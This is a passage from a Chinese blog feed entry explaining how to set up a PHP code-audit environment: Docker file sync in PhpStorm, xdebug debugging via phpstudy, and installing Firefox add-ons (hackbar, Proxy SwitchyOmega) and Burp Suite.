src="/2021/127456454/image-20211205144138163.png" alt="image-20211205144138163"> </p><p>设置文件实时更新到容器内</p><p>打开 文件-》设置-&gt;构建，执行，部署-》Deployment-》options-》修改为Always</p><p><img src="/2021/127456454/image-20211205144915633.png" alt="image-20211205144915633"> </p><p>新建一个文件输入测试代码，成功连接</p><p><img src="/2021/127456454/image-20211205151707728.png" alt="image-20211205151707728"> </p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>在三种环境下搭建了 lamp 环境，用于以后，在不同场景下调试代码。使用docker搭建基础环境，也方便迁移，也方便，如果出现问题，打包给大神，看自己问题出在哪里了，切忌，在上传的源码的时候，先判断，是否可以上传。</p><h2 id="0x02-代码审计的工具介绍"><a href="#0x02-代码审计的工具介绍" class="headerlink" title="0x02 代码审计的工具介绍"></a>0x02 代码审计的工具介绍</h2><p>调试代码使用到三个工具</p><ul><li>burpsuite</li><li>phpstorm（xdebug）</li><li>Firefox （hackbar和Proxy SwitchyOmega）</li></ul><h3 id="1-代码调试工具-phpstorm-xdebug"><a href="#1-代码调试工具-phpstorm-xdebug" class="headerlink" title="1.代码调试工具 phpstorm+xdebug"></a>1.代码调试工具 phpstorm+xdebug</h3><p>xdebug 是一个开源的PHP程序调试器，可以用来跟踪，调试和分析PHP程序的运行状况</p><p>xdebug 在任何环境下调试都是一样，存在一个安装和不安装，<a href="https://xdebug.org/docs/install">官网</a>地址，windows下可以使用 phpstudy自带的xdebug扩展，无需安装，配置和再Linux环境下是一样的。</p><p>我们使用环境 phpstudy + phpstorm + xdebug</p><p>开启xdebug扩展（如果是Linux需要自行安装）</p><p><img src="/2021/127456454/image-20211205155614378.png" alt="image-20211205155614378"> </p><p>打开php.ini，搜索xdebug</p><p>添加 idekey</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdebug.idekey= PHPSTORM</span><br></pre></td></tr></table></figure><p><img src="/2021/127456454/image-20211205160636799.png" alt="image-20211205160636799"> </p><p>重启phpstudy，查看phpinfo，出现如下，表示成功</p><p><img src="/2021/127456454/image-20211205160602490.png" alt="image-20211205160602490"> </p><p>打开phpstorm 进入设置选项-找到对应的版本，如果没有添加即可</p><p><img src="/2021/127456454/image-20211205161055805.png" alt="image-20211205161055805"> </p><p>设置xdebug端口</p><p><img src="/2021/127456454/image-20211205161235410.png" alt="image-20211205161235410">  </p><p>设置 IDE key 和host 以及port-保存并退出</p><p><img src="/2021/127456454/image-20211205161344021.png" alt="image-20211205161344021"> </p><p>选择对应</p><p><img src="/2021/127456454/image-20211205161542656.png" alt="image-20211205161542656"> </p><p>输入你要调试网站的路径，从www下开始输入</p><p><img src="/2021/127456454/image-20211205164221262.png" alt="image-20211205164221262">   </p><p>1.这个样式表示开启调试</p><p>2.选择需要的断点的地方</p><p>3.选择调试</p><p>会跳出浏览器，网址如下</p><p><img src="/2021/127456454/image-20211205164624539.png" alt="image-20211205164624539"> </p><p>此时就已经调试完成了</p><h3 id="2-Firefox安装Proxy-SwitchyOmega和hackbar"><a href="#2-Firefox安装Proxy-SwitchyOmega和hackbar" class="headerlink" title="2.Firefox安装Proxy SwitchyOmega和hackbar"></a>2.Firefox安装Proxy SwitchyOmega和hackbar</h3><p>直接安装即可<a href="https://www.mozilla.org/zh-CN/firefox/new/">Firefox</a></p><p>安装<a href="https://addons.mozilla.org/zh-CN/firefox/search/">hackbar</a> 在Firefox商店搜索hackbar，安装即可</p><p>这里还要使用一个代理，就是 Proxy SwitchyOmega，也可以在商店里搜索，安装即可</p><h3 id="3-burpsuite"><a href="#3-burpsuite" class="headerlink" title="3.burpsuite"></a>3.burpsuite</h3><p>抓包工具</p><p>直接<a href="https://portswigger.net/burp/releases">官网</a>下载</p><p>专业版的话，哪里获取，懂得都懂，不懂的也别问我要，社区版的先用着</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>代码审计讲究的是思路，经验，搭建环境呢，其实都差不多，这看每个人的思路。</p>]]></content>
    
    
    <summary type="html">工欲善其事，必先利其器。</summary>
    
    
    
    <category term="代码审计" scheme="https://fz1lin.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP" scheme="https://fz1lin.com/tags/PHP/"/>
    
    <category term="搭建环境" scheme="https://fz1lin.com/tags/%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/"/>
    
  </entry>
  
</feed>
